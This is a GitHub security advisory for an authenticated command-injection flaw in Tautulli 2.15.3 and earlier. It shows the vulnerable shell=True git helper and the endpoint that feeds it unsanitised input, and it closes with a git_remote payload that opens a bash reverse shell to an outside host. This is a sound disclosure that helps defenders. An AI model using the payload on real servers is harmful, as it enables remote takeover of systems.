Authenticated Remote Code Execution via Command Injection · Advisory · Tautulli/Tautulli · GitHub
[Skip to content](#start-of-content)
{{ message }}
[
Tautulli
](/Tautulli)
/
**
[Tautulli](/Tautulli/Tautulli)
**
Public
*
* [ Notifications
](/login?return_to=/Tautulli/Tautulli) You must be signed in to change notification settings
* [ Fork
623
](/login?return_to=/Tautulli/Tautulli)
*
[
Star
6.5k
](/login?return_to=/Tautulli/Tautulli)
#
Authenticated Remote Code Execution via Command Injection
High
[JonnyWong16](/JonnyWong16)
published
GHSA-jrm9-r57q-6cvf
Sep 9, 2025
## Package
No package listed
## Affected versions
\<=2.15.3
## Patched versions
2.16.0
## Description
### Summary
A command injection vulnerability in Tautulli v2.15.3 allows attackers with administrative privileges to obtain remote code execution on the application server. This vulnerability requires the application to have been cloned from GitHub and installed manually.
### Details
When Tautulli is cloned directly from GitHub and installed manually, the application manages updates and versioning through calls to the `git` command. In the code, this is performed through the `runGit` function in `versioncheck.py`.
```
def runGit(args):
if plexpy.CONFIG.GIT\_PATH:
git\_locations = ['"' + plexpy.CONFIG.GIT\_PATH + '"']
else:
git\_locations = ['git']
if platform.system().lower() == 'darwin':
git\_locations.append('/usr/local/git/bin/git')
output = err = None
for cur\_git in git\_locations:
cmd = cur\_git + ' ' + args
try:
logger.debug('Trying to execute: "' + cmd + '" with shell in ' + plexpy.PROG\_DIR)
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, cwd=plexpy.PROG\_DIR)
output, err = p.communicate()
output = output.strip().decode()
logger.debug('Git output: ' + output)
```
Since `shell=True` is passed to `subproces.Popen`, this call is vulnerable to subject to command injection, as shell characters within arguments will be passed to the underlying shell.
A concrete location where this can be triggered is in the `checkout\_git\_branch` endpoint. This endpoint stores a user-supplied remote and branch name into the `GIT\_REMOTE` and `GIT\_BRANCH` configuration keys without sanitisation.
```
@cherrypy.expose
@requireAuth(member\_of("admin"))
def checkout\_git\_branch(self, git\_remote=None, git\_branch=None, \*\*kwargs):
if git\_branch == plexpy.CONFIG.GIT\_BRANCH:
logger.error("Already on the %s branch" % git\_branch)
raise cherrypy.HTTPRedirect(plexpy.HTTP\_ROOT + "home")
# Set the new git remote and branch
plexpy.CONFIG.GIT\_REMOTE = git\_remote
plexpy.CONFIG.GIT\_BRANCH = git\_branch
plexpy.CONFIG.write()
return self.do\_state\_change('checkout', 'Switching Git Branches', 120)
```
Downstream, these keys are then fetched and passed directly into `runGit` using a format string.
```
def checkout\_git\_branch():
if plexpy.INSTALL\_TYPE == 'git':
logger.info('Attempting to checkout git branch "{}/{}"'.format(plexpy.CONFIG.GIT\_REMOTE,
plexpy.CONFIG.GIT\_BRANCH))
output, err = runGit('fetch {}'.format(plexpy.CONFIG.GIT\_REMOTE))
output, err = runGit('checkout {}'.format(plexpy.CONFIG.GIT\_BRANCH))
```
Hence, code execution can be obtained by using `$()` interpolation in a command like this:
```
`git\_remote=$(sh+-c+'bash+-i+\>%26+/dev/tcp/mdr.mantel.group/443+0\>%261')
`
```
### Severity
High
8.1
#
CVSS overall score
This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).
/ 10
#### CVSS v3 base metrics
Attack vector
Network
Attack complexity
High
Privileges required
High
User interaction
None
Scope
Changed
Confidentiality
High
Integrity
High
Availability
High
Learn more about base metrics
#
CVSS v3 base metrics
Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.
Attack complexity:
More severe for the least complex attacks.
Privileges required:
More severe if no privileges are required.
User interaction:
More severe when no user interaction is required.
Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.
Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.
Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.
Availability:
More severe when the loss of impacted component availability is highest.
CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
### CVE ID
CVE-2025-58763
### Weaknesses
Weakness
CWE-78
####
[Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](/advisories?query=cwe:78)
The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.
[Learn more on MITRE.](https://cwe.mitre.org/data/definitions/78.html)
### Credits
* [](/d-xuan)[
d-xuan](/d-xuan)
Reporter